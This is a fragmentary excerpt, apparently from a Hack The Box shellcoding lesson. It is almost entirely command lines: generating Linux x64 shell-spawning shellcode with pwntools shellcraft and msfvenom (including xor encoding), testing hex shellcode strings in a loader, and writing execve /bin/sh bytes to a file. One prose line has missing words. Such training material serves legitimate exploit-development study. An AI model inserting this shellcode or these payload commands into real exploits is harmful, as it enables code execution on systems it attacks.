...
```shell-session
Arenwald@htb[/htb]$ man -s 2 execve
...
We can zero-out with , and then push it for string terminators instead of pushing :
...
```shell-session
Arenwald@htb[/htb]$ python3 shellcoder.py sh
...
```shell-session
Arenwald@htb[/htb]$ pwn shellcraft -l 'amd64.linux'
...
```shell-session
Arenwald@htb[/htb]$ pwn shellcraft amd64.linux.sh
...
```shell-session
Arenwald@htb[/htb]$ pwn shellcraft amd64.linux.sh -r
...
```shell-session
Arenwald@htb[/htb]$ python3 loader.py '48b801010101010101015048b82e63686f2e726901483104244889e748b801010101010101015048b82e63686f2e7269014831042431f6566a085e4801e6564889e631d26a3b580f05'
...
```shell-session
Arenwald@htb[/htb]$ msfvenom -l payloads | grep 'linux/x64'
...
```shell-session
Arenwald@htb[/htb]$ msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex'
...
```shell-session
Arenwald@htb[/htb]$ python3 loader.py '6a3b589948bb2f62696e2f736800534889e7682d6300004889e652e80300000073680056574889e60f05'
...
```shell-session
Arenwald@htb[/htb]$ msfvenom -l encoders
...
```shell-session
Arenwald@htb[/htb]$ msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor'
...
```shell-session
Arenwald@htb[/htb]$ python3 loader.py 
'4831c94881e9faffffff488d05efffffff48bbf377c2ea294e325c48315827482df8ffffffe2f4994c9a7361f51d3e9a19ed99414e61147a90aac74a4e32147a9190022a4e325c801fc2bc7e06bbbafc72c2ea294e325c'
...
```shell-session
Arenwald@htb[/htb]$ python3 -c "import sys; sys.stdout.buffer.write(bytes.fromhex('b03b4831d25248bf2f62696e2f2f7368574889e752574889e60f05'))" > shell.bin
